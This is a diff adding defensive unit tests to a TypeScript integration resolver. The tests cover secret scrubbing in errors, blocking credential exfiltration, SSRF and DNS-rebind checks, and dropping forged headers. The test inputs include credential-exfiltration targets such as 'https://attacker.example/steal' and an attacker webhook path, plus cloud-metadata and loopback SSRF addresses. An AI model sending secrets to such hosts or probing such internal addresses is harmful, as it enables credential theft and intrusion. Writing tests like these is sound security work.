@@ -15,6 +15,7 @@ import {
   type RunEvent,
   type ToolContext,
 } from "../../src/resolvers/index.ts";
+import type { ResolverError } from "../../src/errors.ts";
 // Package-internal, deliberately not on the `resolvers` barrel.
 import { apiCallToolName } from "../../src/resolvers/integration-api-call.ts";
 import {
@@ -533,6 +534,113 @@ describe("LocalIntegrationResolver", () => {
     ).rejects.toThrow(/not in authorized_uris/);
   });
 
+  it("scrubs a templated secret from the host of an unresolvable-target refusal", async () => {
+    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
+    const integ = makePackage("@acme/api", "1.0.0", "integration", {
+      "integration.json": JSON.stringify(
+        apiKeyIntegrationManifest("@acme/api", { authorizedUris: ["https://*.api-us1.com/**"] })
+          .integration,
+      ),
+    });
+    const bundle = makeBundle(root, [integ]);
+    const secret = "SeCrEtKey42";
+    const resolver = new LocalIntegrationResolver({
+      resolveHost: async () => [],
+      creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: secret } } } },
+      fetch: (() =>
+        Promise.resolve(new Response("{}", { status: 200 }))) as unknown as typeof fetch,
+    });
+    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
+    const { ctx } = makeCtx();
+    const err = await tools[0]!
+      .execute({ method: "GET", target: "https://{{api_key}}.api-us1.com/" }, ctx)
+      .then(
+        () => null,
+        (e: unknown) => e as Error,
+      );
+    expect(err?.message).toContain("could not be resolved");
+    expect(err!.message).not.toContain(secret);
+    expect(err!.message).not.toContain(secret.toLowerCase());
+    expect((err as ResolverError).details?.target).toBe("https://{{api_key}}.api-us1.com/");
+  });
+
+  it("does not scrub a guessed credential value from the host of an untemplated call", async () => {
+    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
+    const integ = makePackage("@acme/api", "1.0.0", "integration", {
+      "integration.json": JSON.stringify(
+        apiKeyIntegrationManifest("@acme/api", { authorizedUris: ["https://*.api-us1.com/**"] })
+          .integration,
+      ),
+    });
+    const resolver = new LocalIntegrationResolver({
+      resolveHost: async () => [],
+      creds: {
+        version: 1,
+        integrations: { "@acme/api": { fields: { api_key: "k", username: "jdoe" } } },
+      },
+      fetch: (() =>
+        Promise.resolve(new Response("{}", { status: 200 }))) as unknown as typeof fetch,
+    });
+    const tools = await resolver.resolve(
+      [{ name: "@acme/api", version: "^1" }],
+      makeBundle(root, [integ]),
+    );
+    const { ctx } = makeCtx();
+    // A matching guess must read exactly like a non-matching one.
+    for (const guess of ["jdoe", "alice"]) {
+      const err = await tools[0]!
+        .execute({ method: "GET", target: `https://${guess}.api-us1.com/` }, ctx)
+        .then(
+          () => null,
+          (e: unknown) => e as Error,
+        );
+      expect(err?.message).toContain(`(${guess}.api-us1.com)`);
+    }
+  });
+
+  it("scrubs the substituted secret from a transport error and its event", async () => {
+    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
+    const integ = makePackage("@acme/api", "1.0.0", "integration", {
+      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
+    });
+    const secret = "SeCrEt loop/42";
+    const encoded = encodeURIComponent(secret);
+    for (const fetchImpl of [
+      // Redirect loop on an allowlisted host: the budget error names the start URL.
+      (u: string) => Promise.resolve(new Response(null, { status: 302, headers: { location: u } })),
+      // Bun-shaped fetch error: full URL in the message and on `.path`.
+      (u: string) =>
+        Promise.reject(
+          Object.assign(new Error(`Unable to connect. Is the computer able to access ${u}?`), {
+            code: "ConnectionRefused",
+            path: u,
+          }),
+        ),
+    ]) {
+      const resolver = new LocalIntegrationResolver({
+        resolveHost: async () => ["203.0.113.7"],
+        creds: { version: 1, integrations: { "@acme/api": { fields: { api_key: secret } } } },
+        fetch: fetchImpl as unknown as typeof fetch,
+      });
+      const tools = await resolver.resolve(
+        [{ name: "@acme/api", version: "^1" }],
+        makeBundle(root, [integ]),
+      );
+      const { ctx, events } = makeCtx();
+      const err = await tools[0]!
+        .execute({ method: "GET", target: "https://api.acme.com/v1?key={{api_key}}" }, ctx)
+        .then(
+          () => null,
+          (e: unknown) => e as Error,
+        );
+      expect(err?.message).toContain("api.acme.com");
+      const seen = JSON.stringify({ message: err!.message, err, events });
+      for (const leaked of [secret, encoded, "SeCrEt", "loop%2F42"]) {
+        expect(seen).not.toContain(leaked);
+      }
+    }
+  });
+
   it("strips a caller-supplied header of the same name (allowServerOverride default false)", async () => {
     const calls: { url: string; init: RequestInit }[] = [];
     const root = makePackage("@acme/agent", "1.0.0", "agent", {});
@@ -970,6 +1078,149 @@ describe("LocalIntegrationResolver — SSRF + redirect hardening (newly added on
     ).rejects.toMatchObject({ code: "RESOLVER_CREDENTIAL_EXFIL_BLOCKED" });
     expect(fetched).toBe(0); // refused before any outbound bytes
   });
+
+  it("refuses a templated secret to another endpoint on a URL-valued field's origin", async () => {
+    // Webhooks-like: allow_all_uris, no allowlist. A field's origin is often
+    // shared by tenants (hooks.slack.com), so it never widens the allowlist.
+    let fetched = 0;
+    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
+    const bundle = makeBundle(root, [
+      makePackage("@acme/hooks", "1.0.0", "integration", {
+        "integration.json": JSON.stringify(
+          apiKeyIntegrationManifest("@acme/hooks", { allowAllUris: true, authorizedUris: [] })
+            .integration,
+        ),
+      }),
+    ]);
+    const resolver = new LocalIntegrationResolver({
+      resolveHost: async () => ["203.0.113.7"],
+      creds: {
+        version: 1,
+        integrations: {
+          "@acme/hooks": {
+            fields: {
+              webhook_url: "https://hooks.example.com/services/TVICTIM/x",
+              secret_header_value: "S",
+            },
+          },
+        },
+      },
+      fetch: (() => {
+        fetched++;
+        return Promise.resolve(new Response("{}", { status: 200 }));
+      }) as unknown as typeof fetch,
+    });
+    const { ctx } = makeCtx();
+    await expect(
+      (await resolver.resolve([{ name: "@acme/hooks", version: "^1" }], bundle))[0]!.execute(
+        {
+          method: "POST",
+          target: "https://hooks.example.com/services/TATTACKER/y",
+          headers: { "X-Secret": "{{secret_header_value}}" },
+        },
+        ctx,
+      ),
+    ).rejects.toMatchObject({ code: "RESOLVER_CREDENTIAL_EXFIL_BLOCKED" });
+    expect(fetched).toBe(0);
+  });
+});
+
+describe("LocalIntegrationResolver — authorized_uris rendered per connection (#1627)", () => {
+  async function toolFor(
+    authorizedUris: string[],
+    fields: Record<string, string>,
+    resolveHost: () => Promise<string[]> = async () => ["203.0.113.7"],
+  ) {
+    const hits: string[] = [];
+    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
+    const integ = makePackage("@acme/wp", "1.0.0", "integration", {
+      "integration.json": JSON.stringify(
+        apiKeyIntegrationManifest("@acme/wp", { authorizedUris }).integration,
+      ),
+    });
+    const resolver = new LocalIntegrationResolver({
+      resolveHost,
+      creds: { version: 1, integrations: { "@acme/wp": { fields: { api_key: "k", ...fields } } } },
+      fetch: ((url: string) => {
+        hits.push(url);
+        return Promise.resolve(new Response("{}", { status: 200 }));
+      }) as unknown as typeof fetch,
+    });
+    const tools = await resolver.resolve(
+      [{ name: "@acme/wp", version: "^1" }],
+      makeBundle(root, [integ]),
+    );
+    const { ctx } = makeCtx();
+    const call = (target: string) =>
+      tools[0]!.execute({ method: "GET", target, headers: { "X-Key": "{{api_key}}" } }, ctx);
+    return { call, hits };
+  }
+
+  it("allows a templated call to the URL-form entry and refuses another host", async () => {
+    const { call, hits } = await toolFor(["{$credential.site_url}/**"], {
+      site_url: "https://wp.example.com",
+    });
+    await call("{{site_url}}/wp-json/x");
+    expect(hits).toEqual(["https://wp.example.com/wp-json/x"]);
+    await expect(call("https://other.example.com/wp-json/x")).rejects.toMatchObject({
+      code: "AUTHORIZED_URIS_MISMATCH",
+    });
+    expect(hits).toHaveLength(1);
+  });
+
+  it("allows the authority form's host and refuses another", async () => {
+    const { call, hits } = await toolFor(["https://{$credential.host}/**"], {
+      host: "wp.example.com",
+    });
+    await call("https://{{host}}/wp-json/x");
+    expect(hits).toEqual(["https://wp.example.com/wp-json/x"]);
+    await expect(call("https://other.example.com/x")).rejects.toMatchObject({
+      code: "AUTHORIZED_URIS_MISMATCH",
+    });
+  });
+
+  it.each([
+    [["{$credential.site_url}/**"], { site_url: "https://169.254.169.254" }, "{{site_url}}/latest"],
+    [["https://{$credential.host}/**"], { host: "127.0.0.1" }, "https://{{host}}/admin"],
+  ])("never pins a connection-supplied internal host (%j)", async (uris, fields, target) => {
+    const { call, hits } = await toolFor(uris, fields);
+    await expect(call(target)).rejects.toMatchObject({ code: "RESOLVER_URL_BLOCKED" });
+    expect(hits).toEqual([]);
+  });
+
+  it("refuses every target when the connection's URL does not render", async () => {
+    const { call, hits } = await toolFor(["{$credential.site_url}/**"], { site_url: "mysite.com" });
+    const err = await call("https://attacker.example/steal").catch((e: unknown) => e);
+    expect(err).toMatchObject({ code: "AUTHORIZED_URIS_EMPTY" });
+    expect((err as Error).message).toContain("does not render");
+    expect(hits).toEqual([]);
+  });
+
+  it("an off-list refusal names the declared template, never the rendered secret URL", async () => {
+    const hook = "https://hooks.example.com/services/T000/B000/SECRETTOKEN";
+    const { call, hits } = await toolFor(["{$credential.webhook_url}"], { webhook_url: hook });
+    const err = await call("https://example.com/").catch((e: unknown) => e);
+    expect(err).toMatchObject({
+      code: "AUTHORIZED_URIS_MISMATCH",
+      details: { allowlist: ["{$credential.webhook_url}"] },
+    });
+    expect(JSON.stringify({ ...(err as object), message: (err as Error).message })).not.toContain(
+      "SECRETTOKEN",
+    );
+    expect(hits).toEqual([]);
+  });
+
+  it("runs the DNS rebind check on a rendered host", async () => {
+    const { call, hits } = await toolFor(
+      ["https://{$credential.host}/**"],
+      { host: "intranet.corp" },
+      async () => ["10.0.0.5"],
+    );
+    await expect(call("https://{{host}}/x")).rejects.toMatchObject({
+      code: "RESOLVER_URL_BLOCKED",
+    });
+    expect(hits).toEqual([]);
+  });
 });
 
 describe("RemoteAppstrateIntegrationResolver", () => {
@@ -1002,6 +1253,40 @@ describe("RemoteAppstrateIntegrationResolver", () => {
     expect(h["X-Org-Id"]).toBe("org_1");
     expect(h["X-Integration-Id"]).toBe("@acme/api");
     expect(h["X-Target"]).toBe("https://api.acme.com/v1/me");
+  });
+
+  it("drops an agent-supplied X-Run-Id (any casing) but keeps X-Connection-Id", async () => {
+    const calls: { url: string; init: RequestInit }[] = [];
+    const root = makePackage("@acme/agent", "1.0.0", "agent", {});
+    const integ = makePackage("@acme/api", "1.0.0", "integration", {
+      "integration.json": JSON.stringify(apiKeyIntegrationManifest("@acme/api").integration),
+    });
+    const bundle = makeBundle(root, [integ]);
+    const resolver = new RemoteAppstrateIntegrationResolver({
+      instance: "https://app.appstrate.com",
+      apiKey: "ask_test",
+      spaceId: "spc_1",
+      extraHeaders: { "X-Run-Id": "run_real" },
+      fetch: ((url: string, init: RequestInit) => {
+        calls.push({ url, init });
+        return Promise.resolve(new Response("{}", { status: 200 }));
+      }) as typeof fetch,
+    });
+    const tools = await resolver.resolve([{ name: "@acme/api", version: "^1" }], bundle);
+    const { ctx } = makeCtx();
+    await tools[0]!.execute(
+      {
+        method: "GET",
+        target: "https://api.acme.com/v1/me",
+        headers: { "x-run-id": "run_forged", "X-Connection-Id": "conn_1" },
+      },
+      ctx,
+    );
+    const h = calls[0]!.init.headers as Record<string, string>;
+    // One key only — a second casing would be merged by fetch into "run_forged, run_real".
+    expect(Object.keys(h).filter((k) => k.toLowerCase() === "x-run-id")).toEqual(["X-Run-Id"]);
+    expect(h["X-Run-Id"]).toBe("run_real");
+    expect(h["X-Connection-Id"]).toBe("conn_1");
   });
 
   it("does not enforce authorizedUris locally (platform gates server-side)", async () => {
